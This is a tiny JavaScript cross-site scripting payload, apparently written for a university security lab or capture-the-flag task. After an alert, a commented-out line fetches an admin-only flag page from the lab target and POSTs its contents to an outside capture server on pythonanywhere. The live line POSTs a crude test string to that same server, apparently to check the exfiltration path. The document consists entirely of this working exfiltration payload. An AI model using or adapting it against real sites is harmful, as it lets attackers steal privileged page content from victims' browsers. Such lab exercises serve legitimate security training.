alert("!");
//fetch("http://corporate.tasks.prak.seclab.cs.msu.ru/admin/flag").then(function(resp){return (resp.text())}).then(function(html){ fetch("https://dalexey.pythonanywhere.com/capture",{ method: "POST", body : "data="+html }) })
fetch("https://dalexey.pythonanywhere.com/capture",{ method: "POST", body : "data=hui" });
